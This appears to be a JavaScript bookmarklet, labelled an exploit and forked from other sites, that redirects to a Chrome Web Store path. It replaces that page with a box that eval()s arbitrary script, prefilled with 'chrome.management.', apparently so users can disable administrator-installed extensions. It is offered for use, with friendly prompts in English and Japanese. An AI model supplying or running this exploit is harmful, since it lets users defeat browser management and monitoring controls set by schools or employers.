// NOT ORIGINAL CODE, CREDIT https://compactcow.com/ltbeef/exploit.js FOR ORIGINAL; This is something that I added to make it more user friendly[]

// Forked from https://myohthegod.net/js/exploit.js

if (!(location.host == "chrome.google.com" && location.pathname.startsWith("/webstorex"))) {
    switch (window.navigator.language) {
        case "ja":
            alert("https://chrome.google.com/webstorexへ移動し終わった後もう一度、このブックマークレートをクリックしてください。");
			location.href = "https://chrome.google.com/webstorex";
            break;

        default:
            alert("IMPORTANT PLS READ: After clicking OK, if it takes you to a 404, you are good. Click the bookmarklet once more after doing that.");
			location.href = "https://chrome.google.com/webstorex";
            break;
    };
}

document.runner = () => {
	try {
		eval(`${document.querySelector("textarea").value}`);
	} catch(error) {
		alert("Error: \n"+error);
	}
}

document.head.innerHTML = `<title>Develop Tool</title>`;
document.body = document.createElement("body");
document.body.innerHTML = '<label for="name">Script: </label> <textarea id="name" name="script" rows="5" cols="33">chrome.management.</textarea><br><button onclick="runner()">Run</button>';
